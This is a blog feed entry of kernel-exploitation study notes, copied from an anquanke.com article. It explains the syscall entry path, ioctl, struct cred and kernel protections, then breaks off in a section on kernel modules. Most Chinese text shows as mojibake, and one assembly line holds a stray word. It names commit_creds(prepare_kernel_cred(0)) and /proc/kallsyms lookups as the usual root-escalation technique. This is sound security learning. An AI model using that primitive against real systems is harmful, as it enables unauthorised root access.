      <link href="2021/08/10/kernal-pwn%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/"/>
      <url>2021/08/10/kernal-pwn%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/</url>
      
        <content type="html"><![CDATA[<p>åŸæ–‡ï¼š<a href="https://www.anquanke.com/post/id/201043">https://www.anquanke.com/post/id/201043</a></p><p>ç…§ç€åŸæ–‡æ‰‹æ‰“äº†ä¸€éï¼Œå°è±¡åŠ æ·±get</p><h2 id="02-kernelç®€ä»‹"><a href="#02-kernelç®€ä»‹" class="headerlink" title="02. kernelç®€ä»‹"></a>02. kernelç®€ä»‹</h2><h3 id="ä»€ä¹ˆæ˜¯kernel"><a href="#ä»€ä¹ˆæ˜¯kernel" class="headerlink" title="ä»€ä¹ˆæ˜¯kernel"></a>ä»€ä¹ˆæ˜¯kernel</h3><p>kernelä¹Ÿæ˜¯ä¸€ä¸ªç¨‹åºï¼Œç”¨æ¥ç®¡ç†è½¯ä»¶å‘å‡ºçš„æ•°æ®çš„IOè¦æ±‚ï¼Œå°†è¿™äº›è¦æ±‚è½¬ä¹‰ä¸ºæŒ‡ä»¤ï¼Œäº¤ç»™CPUå’Œè®¡ç®—æœºçš„å…¶ä»–ç»„ä»¶å¤„ç†ï¼Œkernelæ˜¯ç°ä»£æ“ä½œç³»ç»Ÿæœ€åŸºæœ¬çš„éƒ¨åˆ†ã€‚</p><p><img src="https://img.lhyerror404.cn/error404/2020-03-13-Kernel_Layout.svg" alt=""></p><p>kernelæœ€ä¸»è¦çš„åŠŸèƒ½æœ‰ä¸¤ç‚¹ï¼š</p><ol><li>æ§åˆ¶å¹¶ä¸ç¡¬ä»¶è¿›è¡Œäº¤äº’</li><li>æä¾›applicationèƒ½è¿è¡Œçš„ç¯å¢ƒ</li></ol><p>åŒ…æ‹¬IOï¼Œæƒé™æ§åˆ¶ï¼Œç³»ç»Ÿè°ƒç”¨ï¼Œè¿›ç¨‹ç®¡ç†ï¼Œå†…å­˜ç®¡ç†ç­‰å¤šé¡¹åŠŸèƒ½éƒ½å¯ä»¥å½’ç»“åˆ°ä¸Šè¾¹ä¸¤ç‚¹ä¸­ã€‚</p><p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œkernelçš„crashé€šå¸¸ä¼šå¼•èµ·é‡å¯ã€‚</p><h3 id="Ring-Model"><a href="#Ring-Model" class="headerlink" title="Ring Model"></a>Ring Model</h3><p>intel CPUå°†CPUçš„ç‰¹æƒçº§åˆ«åˆ†ä¸º4ä¸ªçº§åˆ«ï¼šRing 0ï¼ŒRing 1ï¼ŒRing 2ï¼ŒRing 3.</p><p>Ring 0åªç»™OSä½¿ç”¨ï¼ŒRing 3æ‰€æœ‰ç¨‹åºéƒ½å¯ä»¥ä½¿ç”¨ï¼Œå†…å±‚Ring å¯ä»¥éšä¾¿ä½¿ç”¨å¤–å±‚Ringçš„èµ„æºã€‚</p><p>ä½¿ç”¨Ring Modelæ˜¯ä¸ºäº†æå‡ç³»ç»Ÿå®‰å…¨æ€§ï¼Œä¾‹å¦‚æŸä¸ªé—´è°è½¯ä»¶ä½œä¸ºä¸€ä¸ªåœ¨Ring 3è¿è¡Œçš„ç”¨æˆ·ç¨‹åºï¼Œåœ¨ä¸é€šçŸ¥ç”¨æˆ·çš„æ—¶å€™æ‰“å¼€æ‘„åƒå¤´ä¼šè¢«ç»„æˆï¼Œå› ä¸ºè®¿é—®ç¡¬ä»¶éœ€è¦ä½¿ç”¨beingé©±åŠ¨ç¨‹åºä¿ç•™çš„Ring 1çš„æ–¹æ³•ã€‚</p><p>å¤§å¤šæ•°çš„ç°ä»£æ“ä½œç³»ç»Ÿåªä½¿ç”¨äº†Ring 0å’ŒRing 3.</p><h3 id="model-change"><a href="#model-change" class="headerlink" title="model change"></a>model change</h3><h4 id="user-space-to-kernel-space"><a href="#user-space-to-kernel-space" class="headerlink" title="user space to kernel space"></a>user space to kernel space</h4><p>å½“å‘ç”Ÿç³»ç»Ÿè°ƒç”¨ï¼Œäº§ç”Ÿå¼‚å¸¸ï¼Œå¤–è®¾äº§ç”Ÿä¸­æ–­ç­‰äº‹ä»¶æ—¶ï¼Œä¼šå‘ç”Ÿç”¨æˆ·æ€åˆ°å†…æ ¸æ€çš„åˆ‡æ¢æ—¶ï¼Œå…·ä½“è¿‡ç¨‹ä¸ºï¼š</p><ol><li><p>é€šè¿‡<code>swapgs</code>åˆ‡æ¢GSæ®µå¯„å­˜å™¨ï¼Œå°†GSå¯„å­˜å™¨çš„å€¼å’Œä¸€ä¸ªç‰¹å®šä½ç½®çš„å€¼è¿›è¡Œäº¤æ¢ï¼Œç›®çš„æ˜¯ä¿å­˜GSå€¼ï¼ŒåŒæ—¶å°†è¯¥ä½ç½®çš„å€¼ä½œä¸ºå†…æ ¸æ‰§è¡Œæ—¶çš„GSå€¼ä½¿ç”¨ã€‚</p></li><li><p>å°†å½“å‰æ ˆé¡¶ï¼ˆç”¨æˆ·ç©ºé—´æ ˆé¡¶ï¼‰è®°å½•åœ¨CPUç‹¬å å˜é‡åŒºåŸŸé‡Œï¼Œå°†CPUç‹¬å åŒºåŸŸé‡Œè®°å½•çš„å†…æ ¸æ”¾å…¥RSP/ESP</p></li><li><p>é€šè¿‡pushä¿å­˜å„å¯„å­˜å™¨å€¼ï¼Œä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;* SWAPGS_UNSAFE_STACKæ˜¯ä¸€ä¸ªå®ï¼Œx86ç›´æ¥å®šä¹‰ä¸ºswapgsæŒ‡ä»¤ *&#x2F;</span><br><span class="line">SWAPGS_UNSAFE_STACK</span><br><span class="line"></span><br><span class="line">&#x2F;* ä¿å­˜æ ˆå€¼ï¼Œå¹¶è®¾ç½®å†…æ ¸æ ˆ *&#x2F;</span><br><span class="line">movq %rsp, PER_CPU_VAR(rsp_scratch)</span><br><span class="line">movq PER_CPU_VAR(cpu_current_top_of_stack), %rsp</span><br><span class="line"></span><br><span class="line">&#x2F;* é€šè¿‡pushä¿å­˜å¯„å­˜å™¨å€¼ï¼Œå½¢æˆä¸€ä¸ªpt_regsç»“æ„ *&#x2F;</span><br><span class="line">&#x2F;* Construct struct pt_regs on stack *&#x2F;</span><br><span class="line">pushq  $__USER_DS                &#x2F;* pt_regs-&gt;ss *&#x2F;</span><br><span class="line">pushq  PER_CPU_VAR(rsp_scratch)  &#x2F;* pt_regs-&gt;sp *&#x2F;</span><br><span class="line">pushq  %r11                      &#x2F;* pt_regs-&gt;flags *&#x2F;</span><br><span class="line">pushq  $__USER_CS                &#x2F;* pt_regs-&gt;cs *&#x2F;</span><br><span class="line">pushq  %rcx                      &#x2F;* pt_regs-&gt;ip *&#x2F;</span><br><span class="line">pushq  %rax                      &#x2F;* pt_regs-&gt;orig_ax *&#x2F;</span><br><span class="line">pushq  %rdi                      &#x2F;* pt_regs-&gt;di *&#x2F;</span><br><span class="line">pushq  %rsi                      &#x2F;* pt_regs-&gt;si *&#x2F;</span><br><span class="line">pushq  %rdx                      &#x2F;* pt_regs-&gt;dx *&#x2F;</span><br><span class="line">pushq  %rcx tuichu               &#x2F;* pt_regs-&gt;cx *&#x2F;</span><br><span class="line">pushq  $-ENOSYS                  &#x2F;* pt_regs-&gt;ax *&#x2F;</span><br><span class="line">pushq  %r8                       &#x2F;* pt_regs-&gt;r8 *&#x2F;</span><br><span class="line">pushq  %r9                       &#x2F;* pt_regs-&gt;r9 *&#x2F;</span><br><span class="line">pushq  %r10                      &#x2F;* pt_regs-&gt;r10 *&#x2F;</span><br><span class="line">pushq  %r11                      &#x2F;* pt_regs-&gt;r11 *&#x2F;</span><br><span class="line">sub $(6*8), %rsp                 &#x2F;* pt_regs-&gt;bp, bx, r12-15 not saved *&#x2F;</span><br></pre></td></tr></table></figure></li><li><p>é€šè¿‡æ±‡ç¼–æŒ‡ä»¤åˆ¤æ–­æ˜¯å¦ä¸º <code>x32_abi</code>ã€‚</p></li><li><p>é€šè¿‡ç³»ç»Ÿè°ƒç”¨å·ï¼Œè·³åˆ°å…¨å±€å˜é‡ <code>sys_call_table</code> ç›¸åº”ä½ç½®ç»§ç»­æ‰§è¡Œç³»ç»Ÿè°ƒç”¨ã€‚</p></li></ol><h4 id="kernel-space-to-user-space"><a href="#kernel-space-to-user-space" class="headerlink" title="kernel space to user space"></a>kernel space to user space</h4><p>é€€å‡ºæ—¶ï¼Œæµç¨‹å¦‚ä¸‹ï¼š</p><ol><li>é€šè¿‡swapgsæ¢å¤GSå€¼</li><li>é€šè¿‡sysretqæˆ–è€…iretqæ¢å¤åˆ°ç”¨æˆ·æ§ä»¶ç»§ç»­æ‰§è¡Œã€‚å¦‚æœä½¿ç”¨iretqè¿˜éœ€è¦ç»™å‡ºç”¨æˆ·ç©ºé—´çš„ä¸€äº›ä¿¡æ¯ï¼ˆcsï¼Œeflags/rflagsï¼Œesp/rspç­‰ï¼‰</li></ol><h4 id="å…³äºsyscall"><a href="#å…³äºsyscall" class="headerlink" title="å…³äºsyscall"></a>å…³äºsyscall</h4><p>ç³»ç»Ÿè°ƒç”¨ï¼ŒæŒ‡çš„æ˜¯ç”¨æˆ·æ§ä»¶çš„ç¨‹åºå‘æ“ä½œç³»ç»Ÿå†…æ ¸è¯·æ±‚éœ€è¦æ›´é«˜æƒé™çš„æœåŠ¡ï¼Œæ¯”å¦‚IOæ“ä½œæˆ–è€…è¿›ç¨‹é—´é€šä¿¡ã€‚ç³»ç»Ÿè°ƒç”¨æä¾›ç”¨æˆ·ç¨‹åºä¸æ“ä½œç³»ç»Ÿä¹‹é—´çš„æ¥å£ï¼Œéƒ¨åˆ†åº“å‡½æ•°ï¼ˆå¦‚scanfï¼Œputsç­‰IOç›¸å…³çš„å‡½æ•°å®é™…ä¸Šæ˜¯å¯¹ç³»ç»Ÿè°ƒç”¨çš„å°è£…ï¼ˆreadå’Œwriteï¼‰ï¼‰</p><blockquote><p>åœ¨ <em>/usr/include/x86_64-linux-gnu/asm/unistd_64.h</em> å’Œ <em>/usr/include/x86_64-linux-gnu/asm/unistd_32.h</em> åˆ†åˆ«å¯ä»¥æŸ¥çœ‹ 64 ä½å’Œ 32 ä½çš„ç³»ç»Ÿè°ƒç”¨å·ã€‚</p></blockquote><h4 id="ioctl"><a href="#ioctl" class="headerlink" title="ioctl"></a>ioctl</h4><p>åœ¨manæ‰‹å†Œä¸­ï¼Œå…³äºè¿™ä¸ªå‡½æ•°çš„è¯´æ˜å¦‚ä¸‹ï¼š</p><figure class="highlight"><table><tr><td class="code"><pre><span class="line">NAME</span><br><span class="line">       ioctl - control device</span><br><span class="line">SYNOPSIS</span><br><span class="line">       <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line">       <span class="function"><span class="keyword">int</span> <span class="title">ioctl</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">unsigned</span> <span class="keyword">long</span> request, ...)</span></span>;</span><br><span class="line"></span><br><span class="line">DESCRIPTION</span><br><span class="line">       <span class="function">The <span class="title">ioctl</span><span class="params">()</span> system call manipulates the underlying device parameters of special</span></span><br><span class="line">       files.  In particular, many  operating  characteristics  of  character  special</span><br><span class="line">       files  (e.g., terminals) <span class="function">may be controlled with <span class="title">ioctl</span><span class="params">()</span> requests.  The argument</span></span><br><span class="line"><span class="function">       fd must be an open file descriptor.</span></span><br><span class="line"><span class="function"></span></span><br><span class="line">       The second argument is a device-dependent request code.  The third argument  is</span><br><span class="line">       an  untyped  pointer  to  memory.  It<span class="number">&#x27;</span><span class="function">s traditionally <span class="keyword">char</span> *<span class="title">argp</span> <span class="params">(from the days</span></span></span><br><span class="line">       before void * was valid C), and will be so named for this discussion.</span><br><span class="line"></span><br><span class="line">       <span class="function">An <span class="title">ioctl</span><span class="params">()</span> request has encoded in it whether the argument is an in parameter <span class="keyword">or</span></span></span><br><span class="line">       out  parameter, and the size of the argument argp in bytes.  Macros and defines</span><br><span class="line">       used in specifying an ioctl() request are located in the file &lt;sys/ioctl.h&gt;.</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹å‡ºioctlä¹Ÿæ˜¯ä¸€ä¸ªç³»ç»Ÿè°ƒç”¨ï¼Œç”¨äºä¸è®¾å¤‡é€šä¿¡ã€‚</p><p>ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºæ‰“å¼€è®¾å¤‡è¿”å›çš„æ–‡ä»¶æè¿°ç¬¦ï¼Œç¬¬äºŒä¸ªå‚æ•°ä¸ºç”¨æˆ·ç¨‹åºå¯¹è®¾å¤‡çš„æ§åˆ¶å‘½ä»¤ï¼Œå†åè¾¹çš„å‚æ•°åˆ™æ˜¯ä¸€äº›è¡¥å……å‚æ•°ï¼Œä¸è®¾å¤‡æœ‰å…³ã€‚</p><blockquote><p>ä½¿ç”¨ ioctl è¿›è¡Œé€šä¿¡çš„åŸå› ï¼š</p><p>æ“ä½œç³»ç»Ÿæä¾›äº†å†…æ ¸è®¿é—®æ ‡å‡†å¤–éƒ¨è®¾å¤‡çš„ç³»ç»Ÿè°ƒç”¨ï¼Œå› ä¸ºå¤§å¤šæ•°ç¡¬ä»¶è®¾å¤‡åªèƒ½å¤Ÿåœ¨å†…æ ¸ç©ºé—´å†…ç›´æ¥å¯»å€, ä½†æ˜¯å½“è®¿é—®éæ ‡å‡†ç¡¬ä»¶è®¾å¤‡è¿™äº›ç³»ç»Ÿè°ƒç”¨æ˜¾å¾—ä¸åˆé€‚, æœ‰æ—¶å€™ç”¨æˆ·æ¨¡å¼å¯èƒ½éœ€è¦ç›´æ¥è®¿é—®è®¾å¤‡ã€‚</p><p>æ¯”å¦‚ï¼Œä¸€ä¸ªç³»ç»Ÿç®¡ç†å‘˜å¯èƒ½è¦ä¿®æ”¹ç½‘å¡çš„é…ç½®ã€‚ç°ä»£æ“ä½œç³»ç»Ÿæä¾›äº†å„ç§å„æ ·è®¾å¤‡çš„æ”¯æŒï¼Œæœ‰ä¸€äº›è®¾å¤‡å¯èƒ½æ²¡æœ‰è¢«å†…æ ¸è®¾è®¡è€…è€ƒè™‘åˆ°ï¼Œå¦‚æ­¤ä¸€æ¥æä¾›ä¸€ä¸ªè¿™æ ·çš„ç³»ç»Ÿè°ƒç”¨æ¥ä½¿ç”¨è®¾å¤‡å°±å˜å¾—ä¸å¯èƒ½äº†ã€‚</p><p>ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œå†…æ ¸è¢«è®¾è®¡æˆå¯æ‰©å±•çš„ï¼Œå¯ä»¥åŠ å…¥ä¸€ä¸ªç§°ä¸ºè®¾å¤‡é©±åŠ¨çš„æ¨¡å—ï¼Œé©±åŠ¨çš„ä»£ç å…è®¸åœ¨å†…æ ¸ç©ºé—´è¿è¡Œè€Œä¸”å¯ä»¥å¯¹è®¾å¤‡ç›´æ¥å¯»å€ã€‚ä¸€ä¸ª Ioctl æ¥å£æ˜¯ä¸€ä¸ªç‹¬ç«‹çš„ç³»ç»Ÿè°ƒç”¨ï¼Œé€šè¿‡å®ƒç”¨æˆ·ç©ºé—´å¯ä»¥è·Ÿè®¾å¤‡é©±åŠ¨æ²Ÿé€šã€‚å¯¹è®¾å¤‡é©±åŠ¨çš„è¯·æ±‚æ˜¯ä¸€ä¸ªä»¥è®¾å¤‡å’Œè¯·æ±‚å·ç ä¸ºå‚æ•°çš„ Ioctl è°ƒç”¨ï¼Œå¦‚æ­¤å†…æ ¸å°±å…è®¸ç”¨æˆ·ç©ºé—´è®¿é—®è®¾å¤‡é©±åŠ¨è¿›è€Œè®¿é—®è®¾å¤‡è€Œä¸éœ€è¦äº†è§£å…·ä½“çš„è®¾å¤‡ç»†èŠ‚ï¼ŒåŒæ—¶ä¹Ÿä¸éœ€è¦ä¸€å¤§å †é’ˆå¯¹ä¸åŒè®¾å¤‡çš„ç³»ç»Ÿè°ƒç”¨ã€‚</p></blockquote><p>ï¼ˆå¦™å•Šï¼‰</p><h3 id="å†…æ ¸æ€å‡½æ•°è°ƒç”¨"><a href="#å†…æ ¸æ€å‡½æ•°è°ƒç”¨" class="headerlink" title="å†…æ ¸æ€å‡½æ•°è°ƒç”¨"></a>å†…æ ¸æ€å‡½æ•°è°ƒç”¨</h3><p>ç›¸æ¯”ç”¨æˆ·æ€å‡½æ•°ï¼Œå†…æ ¸æ€çš„å‡½æ•°æœ‰äº†ä¸€äº›å˜åŒ–ï¼š</p><ol><li>printfå˜æ›´ä¸ºprintkï¼Œå€¼å¾—æ³¨æ„çš„æ˜¯printkä¸ä¸€å®šä¼šæŠŠå†…å®¹æ˜¾ç¤ºåˆ°ç»ˆç«¯ä¸Šï¼Œ<strong>ä½†æ˜¯ä¸€å®šåœ¨å†…æ ¸ç¼“å†²åŒºé‡Œ</strong>ï¼Œå¯ä»¥é€šè¿‡<code>dmesg</code>æŸ¥çœ‹æ•ˆæœ</li><li>memcpyå˜æ›´ä¸ºcopy_from_user/copy_to_user<ol><li>Copy_from_userå®ç°äº†å°†ç”¨æˆ·ç©ºé—´çš„æ•°æ®ä¼ é€åˆ°å†…æ ¸ç©ºé—´</li><li>Copy_to_userå®ç°äº†å°†å†…æ ¸ç©ºé—´çš„æ•°æ®ä¼ é€åˆ°ç”¨æˆ·ç©ºé—´</li></ol></li><li>mallocå˜æ›´ä¸ºkmallocï¼Œå†…æ ¸æ€çš„å†…å­˜åˆ†é…å‡½æ•°ï¼Œå’Œmallocç›¸ä¼¼ï¼Œä½†ä½¿ç”¨çš„æ˜¯slab/slubåˆ†é…å™¨</li><li>freeå˜æ›´ä¸ºkfreeï¼ŒåŒkmalloc</li></ol><p>åŒæ—¶ï¼Œkernelè´Ÿè´£ç®¡ç†è¿›ç¨‹ï¼Œå› æ­¤kernelä¹Ÿè®°å½•äº†è¿›ç¨‹çš„æƒé™ã€‚kernelä¸­æœ‰ä¸¤ä¸ªå¯ä»¥æ–¹ä¾¿çš„æ”¹å˜æƒé™çš„å‡½æ•°ï¼š</p><ol><li><code>int commit_creds(struct cred *new)</code></li><li><code>struct cred* prepare_kernel_cred(struct task_struct* daemon)</code></li></ol><p>ä»å‡½æ•°åä¹Ÿå¯ä»¥çœ‹å‡ºï¼Œæ‰§è¡Œcommit_creds(prepare_kernel_cred(0))å³è·å¾—rootæƒé™ï¼Œ0è¡¨ç¤ºä»¥0å·è¿›ç¨‹ä½œä¸ºå‚è€ƒå‡†å¤‡æ–°çš„credentials</p><p>æ‰§è¡Œcommit_creds(prepare_kernel_cred(0))ä¹Ÿæ˜¯æœ€å¸¸ç”¨çš„ææƒæ‰‹æ®µï¼Œä¸¤ä¸ªå‡½æ•°çš„åœ°å€éƒ½å¯ä»¥åœ¨/proc/kallsymsä¸­æŸ¥çœ‹ï¼ˆè¾ƒè€çš„å†…æ ¸ç‰ˆæœ¬ä¸­æ˜¯/proc/ksymsï¼‰</p><p><img src="/Users/lemon/Library/Application Support/typora-user-images/image-20210811161724893.png" alt="image-20210811161724893" style="zoom:50%;" /></p><p>ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œ/proc/kallsymsçš„å†…å®¹éœ€è¦rootæƒé™æ‰èƒ½æŸ¥çœ‹ï¼Œè‹¥ä»¥érootæƒé™æŸ¥çœ‹å°†æ˜¾ç¤ºä¸º0åœ°å€ï¼ˆemmï¼‰</p><h3 id="struct-cred-è¿›ç¨‹æƒé™ç»“æ„ä½“"><a href="#struct-cred-è¿›ç¨‹æƒé™ç»“æ„ä½“" class="headerlink" title="struct cred - è¿›ç¨‹æƒé™ç»“æ„ä½“"></a>struct cred - è¿›ç¨‹æƒé™ç»“æ„ä½“</h3><p>å†…æ ¸ä½¿ç”¨credç»“æ„ä½“è®°å½•è¿›ç¨‹çš„æƒé™ï¼Œæ¯ä¸ªè¿›ç¨‹ä¸­éƒ½æœ‰ä¸€ä¸ªcredç»“æ„ï¼Œè¿™ä¸ªç»“æ„ä¿å­˜äº†è¯¥è¿›ç¨‹çš„æƒé™ç­‰ä¿¡æ¯ï¼ˆuidï¼Œgidç­‰ï¼‰ï¼Œå¦‚æœèƒ½ä¿®æ”¹æŸä¸ªè¿›ç¨‹çš„credï¼Œé‚£ä¹ˆä¹Ÿå°±ä¿®æ”¹äº†è¿™ä¸ªè¿›ç¨‹çš„æƒé™ã€‚ç»“æ„ä½“æºç å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> &#123;</span></span><br><span class="line">    <span class="keyword">atomic_t</span>    usage;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span></span><br><span class="line">    <span class="keyword">atomic_t</span>    subscribers;           <span class="comment">/* number of processes subscribed */</span></span><br><span class="line">    <span class="keyword">void</span>        *put_addr;</span><br><span class="line">    <span class="keyword">unsigned</span>    magic;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CRED_MAGIC  0x43736564</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CRED_MAGIC_DEAD 0x44656144</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">kuid_t</span>      uid;                   <span class="comment">/* real UID of the task */</span></span><br><span class="line">    <span class="keyword">kgid_t</span>      gid;                   <span class="comment">/* real GID of the task */</span></span><br><span class="line">    <span class="keyword">kuid_t</span>      suid;                  <span class="comment">/* saved UID of the task */</span></span><br><span class="line">    <span class="keyword">kgid_t</span>      sgid;                  <span class="comment">/* saved GID of the task */</span></span><br><span class="line">    <span class="keyword">kuid_t</span>      euid;                  <span class="comment">/* effective UID of the task */</span></span><br><span class="line">    <span class="keyword">kgid_t</span>      egid;                  <span class="comment">/* effective GID of the task */</span></span><br><span class="line">    <span class="keyword">kuid_t</span>      fsuid;                 <span class="comment">/* UID for VFS ops */</span></span><br><span class="line">    <span class="keyword">kgid_t</span>      fsgid;                 <span class="comment">/* GID for VFS ops */</span></span><br><span class="line">    <span class="keyword">unsigned</span>    securebits;            <span class="comment">/* SUID-less security management */</span></span><br><span class="line">    <span class="keyword">kernel_cap_t</span>    cap_inheritable;   <span class="comment">/* caps our children can inherit */</span></span><br><span class="line">    <span class="keyword">kernel_cap_t</span>    cap_permitted;     <span class="comment">/* caps we&#x27;re permitted */</span></span><br><span class="line">    <span class="keyword">kernel_cap_t</span>    cap_effective;     <span class="comment">/* caps we can actually use */</span></span><br><span class="line">    <span class="keyword">kernel_cap_t</span>    cap_bset;          <span class="comment">/* capability bounding set */</span></span><br><span class="line">    <span class="keyword">kernel_cap_t</span>    cap_ambient;       <span class="comment">/* Ambient capability set */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_KEYS</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span>   jit_keyring;       <span class="comment">/* default keyring to attach requested</span></span><br><span class="line"><span class="comment">    /* keys to */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span> __<span class="title">rcu</span> *<span class="title">session_keyring</span>;</span> <span class="comment">/* keyring inherited over fork */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span>  *<span class="title">process_keyring</span>;</span>      <span class="comment">/* keyring private to this process */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span>  *<span class="title">thread_keyring</span>;</span>       <span class="comment">/* keyring private to this thread */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span>  *<span class="title">request_key_auth</span>;</span>     <span class="comment">/* assumed request_key authority */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line">    <span class="keyword">void</span>        *security;             <span class="comment">/* subjective LSM security */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span>;</span>          <span class="comment">/* real user ID subscription */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_namespace</span> *<span class="title">user_ns</span>;</span>    <span class="comment">/* user_ns the caps and keyrings are relative to. */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">group_info</span> *<span class="title">group_info</span>;</span>     <span class="comment">/* supplementary groups for euid/fsgid */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span> <span class="title">rcu</span>;</span>               <span class="comment">/* RCU deletion hook */</span></span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure><h3 id="å†…æ ¸ä¿æŠ¤æœºåˆ¶"><a href="#å†…æ ¸ä¿æŠ¤æœºåˆ¶" class="headerlink" title="å†…æ ¸ä¿æŠ¤æœºåˆ¶"></a>å†…æ ¸ä¿æŠ¤æœºåˆ¶</h3><ol><li>smep: Supervisor Mode Execute Protectionï¼Œå½“å¤„ç†å™¨å¤„äºring 0æ¨¡å¼ï¼Œæ‰§è¡Œç”¨æˆ·ç©ºé—´çš„ä»£ç ä¼šè§¦å‘é¡µé”™è¯¯ï¼ˆåœ¨armä¸­è¯¥ä¿æŠ¤ç§°ä¸ºPXNï¼‰ã€‚</li><li>smap: Supervisor Mode Access Protectionï¼Œç±»ä¼¼äºsmepï¼Œå½“å¤„ç†å™¨å¤„äºring 0æ¨¡å¼ï¼Œè®¿é—®ç”¨æˆ·ç©ºé—´çš„æ•°æ®ä¼šå‘ç”Ÿé¡µé”™è¯¯ã€‚</li><li>MMAP_MIN_ADDR: æ§åˆ¶ç€mmapèƒ½å¤Ÿæ˜ å°„çš„æœ€ä½å†…å­˜åœ°å€ï¼Œé˜²æ­¢ç”¨æˆ·éæ³•åˆ†é…å¹¶è®¿é—®ä½åœ°å€æ•°æ®ã€‚</li><li>KASLR: Kernel Address Space Layout Randomizationï¼Œå†…æ ¸åœ°å€ç©ºé—´å¸ƒå±€éšæœºåŒ–ï¼Œå¼€å¯åï¼Œå…è®¸kernel imageåŠ è½½åˆ°VMALLOCåŒºåŸŸçš„ä»»ä½•ä½ç½®ã€‚</li></ol><p>Canaryï¼ŒDEPï¼ŒPIEï¼ŒRELROç­‰ä¿æŠ¤ä¸ç”¨æˆ·æ€åŸç†å’Œä½œç”¨ç›¸åŒã€‚</p><h2 id="03-LKMsä»‹ç»"><a href="#03-LKMsä»‹ç»" class="headerlink" title="03. LKMsä»‹ç»"></a>03. LKMsä»‹ç»</h2><h3 id="ä»€ä¹ˆæ˜¯LKMs"><a href="#ä»€ä¹ˆæ˜¯LKMs" class="headerlink" title="ä»€ä¹ˆæ˜¯LKMs"></a>ä»€ä¹ˆæ˜¯LKMs</h3><p>LKMs (Loadable Kernel Modules)ç§°ä¸ºå¯åŠ è½½æ ¸å¿ƒæ¨¡å—(å†…æ ¸æ¨¡å—)ï¼Œ å…¶å¯ä»¥çœ‹ä½œæ˜¯è¿è¡Œåœ¨å†…æ ¸ç©ºé—´çš„å¯æ‰§è¡Œç¨‹åºï¼ŒåŒ…æ‹¬ï¼š</p><ul><li>é©±åŠ¨ç¨‹åº Device drivers<ul><li>è®¾å¤‡é©±åŠ¨</li><li>æ–‡ä»¶ç³»ç»Ÿé©±åŠ¨</li><li>â€¦â€¦</li></ul></li><li>å†…æ ¸æ‰©å±•æ¨¡å— modules</li></ul><p>LKMsçš„æ–‡ä»¶æ ¼å¼å’Œç”¨æˆ·æ€çš„å¯æ‰§è¡Œç¨‹åºç›¸åŒï¼ŒLinuxä¸‹ä¸ºELFï¼ŒWindowsä¸‹ä¸ºexe/dllï¼Œmacä¸‹ä¸ºMACH-Oï¼Œå› æ­¤å¯ä»¥ä½¿ç”¨IDAç­‰å·¥å…·æ¥åˆ†æå†…æ ¸æ¨¡å—ã€‚</p><p>æ¨¡å—å¯ä»¥è¢«å•ç‹¬ç¼–è¯‘ï¼Œä½†æ˜¯ä¸èƒ½å•ç‹¬è¿è¡Œã€‚å®ƒåœ¨è¿è¡Œæ—¶è¢«é“¾æ¥åˆ°å†…æ ¸ä½œä¸ºå†…æ ¸çš„ä¸€éƒ¨åˆ†åœ¨å†…æ ¸ç©ºé—´è¿è¡Œï¼Œè¿™ä¸è¿è¡Œåœ¨ç”¨æˆ·ç©ºé—´çš„è¿›ç¨‹ä¸åŒã€‚</p><p>æ¨¡å—é€šå¸¸ç”¨æ¥å®ç°ä¸€ç§æ–‡ä»¶ç³»ç»Ÿã€ä¸€ä¸ªé©±åŠ¨ç¨‹åºæˆ–è€…å…¶ä»–å†…æ ¸ä¸Šå±‚çš„åŠŸèƒ½ã€‚</p><blockquote><p>Linux å†…æ ¸ä¹‹æ‰€ä»¥æä¾›æ¨¡å—æœºåˆ¶ï¼Œæ˜¯å› ä¸ºå®ƒæœ¬èº«æ˜¯ä¸€ä¸ªå•å†…æ ¸ (monolithic kernel)ã€‚å•å†…æ ¸çš„ä¼˜ç‚¹æ˜¯æ•ˆç‡é«˜ï¼Œå› 